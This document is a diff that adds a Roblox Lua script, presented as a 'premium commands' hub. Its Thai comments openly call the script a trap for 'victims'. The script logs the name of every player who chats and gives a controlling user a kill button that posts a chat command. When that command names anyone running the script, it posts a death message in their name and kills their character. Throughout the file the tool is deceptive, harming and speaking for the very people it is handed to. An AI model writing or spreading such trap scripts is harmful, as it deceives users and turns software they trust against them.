@@ -1,0 +1,250 @@
+--// TOU HUB V10 - VICTIM DETECTOR + AUTO KILL ON !ฆ่า 🕵️‍♂️🪤
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local player = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+--// ตารางเก็บชื่อ
+local nameLog = {}
+
+--// สร้าง GUI หลัก
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TOU_HUB_GUI"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 12)
+Corner.Parent = MainFrame
+
+local Shadow = Instance.new("ImageLabel")
+Shadow.Size = UDim2.new(1, 10, 1, 10)
+Shadow.Position = UDim2.new(0, -5, 0, -5)
+Shadow.BackgroundTransparency = 1
+Shadow.Image = "rbxassetid://6014261993"
+Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.ImageTransparency = 0.6
+Shadow.ZIndex = 0
+Shadow.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.BackgroundTransparency = 1
+Title.Text = "คำสั่งพรีเมี่ยม🔥"
+Title.TextColor3 = Color3.fromRGB(255, 85, 85)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = MainFrame
+
+local ScrollFrame = Instance.new("ScrollingFrame")
+ScrollFrame.Size = UDim2.new(1, -20, 1, -70)
+ScrollFrame.Position = UDim2.new(0, 10, 0, 60)
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.ScrollBarThickness = 6
+ScrollFrame.ClipsDescendants = true
+ScrollFrame.Parent = MainFrame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 8)
+UIListLayout.Parent = ScrollFrame
+
+--// ฟังก์ชันส่งข้อความในแชท
+local function sendChat(msg)
+    pcall(function()
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then
+            channel:SendAsync(msg)
+        end
+    end)
+end
+
+--// ฟังก์ชันฆ่าตัวเอง (สำหรับเหยื่อ)
+local function killSelf()
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.Health = 0
+    end
+end
+
+--// ฟังก์ชันเปิดเมนูคำสั่ง (สำหรับ master)
+local function openCommandMenu(entryFrame, realName, displayName)
+    for _, child in pairs(MainFrame:GetChildren()) do
+        if child.Name == "CommandMenu" then
+            child:Destroy()
+        end
+    end
+
+    local menu = Instance.new("Frame")
+    menu.Name = "CommandMenu"
+    menu.Size = UDim2.new(0, 200, 0, 120)
+    menu.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    menu.BorderSizePixel = 0
+    menu.ZIndex = 10
+    menu.Parent = MainFrame
+
+    local entryPos = entryFrame.AbsolutePosition
+    local entrySize = entryFrame.AbsoluteSize
+    local mainPos = MainFrame.AbsolutePosition
+    menu.Position = UDim2.new(0, entryPos.X - mainPos.X + entrySize.X + 10, 0, entryPos.Y - mainPos.Y)
+
+    local menuCorner = Instance.new("UICorner")
+    menuCorner.CornerRadius = UDim.new(0, 8)
+    menuCorner.Parent = menu
+
+    -- ปุ่ม "ฆ่า" (ส่ง !ฆ่า ชื่อ → เหยื่อเห็น + ตาย)
+    local killBtn = Instance.new("TextButton")
+    killBtn.Size = UDim2.new(1, -20, 0, 40)
+    killBtn.Position = UDim2.new(0, 10, 0, 10)
+    killBtn.BackgroundColor3 = Color3.fromRGB(180, 20, 20)
+    killBtn.Text = "ฆ่า " .. realName
+    killBtn.TextColor3 = Color3.new(1,1,1)
+    killBtn.Font = Enum.Font.GothamBold
+    killBtn.ZIndex = 11
+    killBtn.Parent = menu
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = killBtn
+
+    killBtn.MouseButton1Click:Connect(function()
+        -- ส่ง !ฆ่า ชื่อ (เหยื่อจะเห็น + ฆ่าตัวเอง)
+        sendChat("!ฆ่า " .. realName)
+        menu:Destroy()
+    end)
+
+    -- ปุ่มปิด
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -35, 0, 5)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Text = "✖"
+    closeBtn.TextColor3 = Color3.new(1,0,0)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.ZIndex = 11
+    closeBtn.Parent = menu
+
+    closeBtn.MouseButton1Click:Connect(function()
+        menu:Destroy()
+    end)
+
+    local cover = Instance.new("TextButton")
+    cover.Size = UDim2.new(1,0,1,0)
+    cover.BackgroundTransparency = 1
+    cover.ZIndex = 9
+    cover.Text = ""
+    cover.Parent = menu
+end
+
+--// ฟังก์ชันเพิ่มชื่อลง GUI
+local function addToGUI(realName, displayName, thumb)
+    if nameLog[realName] then return end
+    nameLog[realName] = true
+
+    local Entry = Instance.new("Frame")
+    Entry.Size = UDim2.new(1, 0, 0, 70)
+    Entry.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    Entry.BorderSizePixel = 0
+    Entry.Parent = ScrollFrame
+
+    local EntryCorner = Instance.new("UICorner")
+    EntryCorner.CornerRadius = UDim.new(0, 8)
+    EntryCorner.Parent = Entry
+
+    local Avatar = Instance.new("ImageLabel")
+    Avatar.Size = UDim2.new(0, 50, 0, 50)
+    Avatar.Position = UDim2.new(0, 10, 0, 10)
+    Avatar.BackgroundTransparency = 1
+    Avatar.Image = thumb
+    Avatar.Parent = Entry
+
+    local AvatarCorner = Instance.new("UICorner")
+    AvatarCorner.CornerRadius = UDim.new(1, 0)
+    AvatarCorner.Parent = Avatar
+
+    local RealNameLabel = Instance.new("TextLabel")
+    RealNameLabel.Size = UDim2.new(1, -130, 0, 25)
+    RealNameLabel.Position = UDim2.new(0, 70, 0, 8)
+    RealNameLabel.BackgroundTransparency = 1
+    RealNameLabel.Text = "👤 " .. realName
+    RealNameLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    RealNameLabel.Font = Enum.Font.Gotham
+    RealNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    RealNameLabel.Parent = Entry
+
+    local DisplayLabel = Instance.new("TextLabel")
+    DisplayLabel.Size = UDim2.new(1, -130, 0, 25)
+    DisplayLabel.Position = UDim2.new(0, 70, 0, 33)
+    DisplayLabel.BackgroundTransparency = 1
+    DisplayLabel.Text = "🖊️ " .. displayName
+    DisplayLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    DisplayLabel.Font = Enum.Font.Gotham
+    DisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DisplayLabel.Parent = Entry
+
+    local cmdBtn = Instance.new("TextButton")
+    cmdBtn.Size = UDim2.new(0, 80, 0, 40)
+    cmdBtn.Position = UDim2.new(1, -90, 0, 15)
+    cmdBtn.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+    cmdBtn.Text = "คำสั่ง"
+    cmdBtn.TextColor3 = Color3.new(1,1,1)
+    cmdBtn.Font = Enum.Font.GothamBold
+    cmdBtn.Parent = Entry
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = cmdBtn
+
+    cmdBtn.MouseButton1Click:Connect(function()
+        openCommandMenu(Entry, realName, displayName)
+    end)
+
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
+end
+
+--// ตรวจจับข้อความ + TRAP !ฆ่า (สำหรับเหยื่อ)
+local connection
+connection = TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
+    local sender = messageData.TextSource
+    local text = messageData.Text:lower()
+
+    -- เก็บชื่อทุกคนที่พิมพ์
+    if sender then
+        local targetPlayer = Players:GetPlayerByUserId(sender.UserId)
+        if targetPlayer then
+            local realName = targetPlayer.Name
+            local displayName = targetPlayer.DisplayName
+            local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+
+            addToGUI(realName, displayName, thumb)
+
+            -- Trigger
+            if messageData.Text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUx1" then
+                sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
+            end
+
+            -- !เช็ค
+            if text == "!เช็ค" and sender.UserId == player.UserId then
+                sendChat("✅ **TOU HUB ACTIVE** | " .. player.Name .. " 🕶️")
+            end
+        end
+    end
+
+    -- 🔥 TRAP: ถ้าเห็น "!ฆ่า ชื่อตัวเอง" → ฆ่าตัวเองทันที!
+    if text:find("!ฆ่า") and text:find(player.Name:lower()) then
+        sendChat("💀 **เห็นคำสั่งฆ่าแล้ว!** " .. player.Name .. " ตาย!")  -- แสดงให้เห็นชัด
+        task.wait(0.1)  -- รอให้เห็น
+        killSelf()
+    end
+end)
+
+UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
+end)
